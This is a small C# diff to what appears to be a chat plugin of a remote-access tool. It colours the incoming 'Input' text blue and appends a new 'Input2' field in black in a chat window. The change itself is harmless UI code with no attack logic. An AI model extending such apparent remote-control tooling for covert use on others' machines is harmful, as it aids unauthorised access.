@@ -2,6 +2,7 @@
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
@@ -64,7 +65,10 @@ namespace Plugin
                 Packet.GetFormChat.Invoke((MethodInvoker)(() =>
                 {
                     Console.Beep();
-                    Packet.GetFormChat.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("Input").AsString + Environment.NewLine);
+                    Packet.GetFormChat.richTextBox1.SelectionColor = Color.Blue;
+                    Packet.GetFormChat.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("Input").AsString);
+                    Packet.GetFormChat.richTextBox1.SelectionColor = Color.Black;
+                    Packet.GetFormChat.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("Input2").AsString + Environment.NewLine);
                 }));
             }
         }
